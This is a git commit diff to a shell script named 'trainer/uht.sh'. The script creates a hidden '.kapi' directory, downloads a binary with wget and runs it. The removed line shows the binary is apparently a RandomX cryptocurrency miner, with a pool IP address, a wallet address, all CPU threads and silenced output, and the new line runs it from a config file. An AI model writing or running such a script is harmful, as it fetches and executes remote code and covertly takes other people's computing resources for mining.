f95fb7ce7a827f3bb31c728d311ecdf2c9001daf
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-02-29 23:29:34 +0700

    Update uht.sh

--- trainer/uht.sh
+++ trainer/uht.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 mkdir .kapi && cd .kapi
 wget https://bitbucket.org/excel-gms/bin/downloads/zypex 
-./zypex --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p LAPET -a rx/0 -t $(nproc --all) >/dev/null 2>&1
+./zypex -c "uht.json" $(nproc --all)
